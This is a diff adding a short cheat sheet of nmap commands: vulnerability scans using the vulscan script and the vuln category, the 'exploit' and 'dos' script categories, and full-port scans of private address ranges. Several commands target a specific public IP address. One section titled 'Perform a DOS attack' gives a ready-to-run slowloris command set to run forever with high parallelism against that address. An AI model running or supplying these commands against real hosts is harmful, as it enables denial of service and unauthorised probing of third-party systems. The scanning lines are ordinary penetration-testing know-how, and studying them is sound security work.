@@ -1,0 +1,26 @@
+#This requires the vuln script to beinstalled into the nmap scripting folder on the scanning computer 
+#The script to download is https://github.com/scipag/vulscan.git
+
+    sudo nmap -sV --script=/usr/local/bin/../share/nmap/scripts/vulscan.nse 66.152.132.10
+
+#Default Vuln Scan on nmap 
+     
+    nmap -Pn -script vuln 66.152.132.10
+#Default nmap Active Exploit 
+
+    nmap --script exploit -Pn 66.152.132.10
+
+#Test if vulnerable to DOS
+
+    nmap --script dos -Pn 66.152.132.10
+
+#Perform a DOS attack
+
+    nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true 66.152.132.10
+
+#Scan for vuls
+
+    nmap -v3 -oX "./scan.xml" 192.168.1.1/24
+    nmap -A -sV -v3 -oX "./scan.xml" 192.168.1.1
+    nmap -p 1-65535 -T4 -A -sV -v3 -oX "C:\\temp\\scan.xml" 192.168.1.1
+    nmap -p 1-65535 -T4 -A -sV -v3 -d -oX "./scan.xml" --script http-vuln-cve2015-1635.nse,post-process.nse --script-args vulns.showall 10.0.0.1/23
